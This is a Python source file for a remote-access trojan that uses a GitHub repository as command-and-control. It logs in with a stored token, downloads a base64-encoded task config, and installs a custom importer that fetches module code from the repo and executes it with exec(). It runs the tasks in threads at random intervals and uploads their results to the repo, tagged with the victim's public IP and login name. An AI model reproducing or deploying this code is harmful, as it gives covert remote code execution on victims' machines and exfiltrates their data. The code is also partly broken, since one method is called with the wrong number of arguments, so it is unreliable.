import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime
import os
import requests
def github_connect():
    with open('weather.txt') as f:
        token = f.read()
    user = 'apokalito'
    sess = github3.login(token=token)
    return sess.repository(user, 'makeitrain')
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task_item in config:
            if task_item['module'] not in sys.modules:
                try:
                    exec("import %s" % task_item['module'])
                except ModuleNotFoundError:
                    exec("import %s" % os.path.basename(task_item['module']))
        return config
    '''for module_name, module_code in modules.items():
            try:
                exec(module_code, globals())
            except Exception as e:
                print(f"Error importing module '{module_name}': {e}")

        return modules 
        '''
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)
    def store_module_result(self, data, module):
        l = requests.get('http://myip.ipip.net').text
        message = datetime.now().isoformat()
        message = message.split('T')[1]
        weekday = str(datetime.now()).split(' ')[0]
        remote_path = f"data/{self.id}/{l.split(' ')[1].split('：')[1]}{os.getlogin()}/{weekday}/{message}({module} module).data"
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(
            remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner,
                                          args=(task['module'],))
                thread.start()
                time.sleep(random.randint(1, 10))
                time.sleep(random.randint(30 * 60, 3 * 60 * 60))
class GitImporter:
    def __init__(self):
        self.current_module_code = ""
    def find_module(self, name, path=None):
        print("[*] Attempting to retrieve %s" % name)
        self.repo = github_connect()
        new_library = get_file_contents('modules', f'{name}.py', self.repo)
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self.current_module_code
    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('pk')
    trojan.run()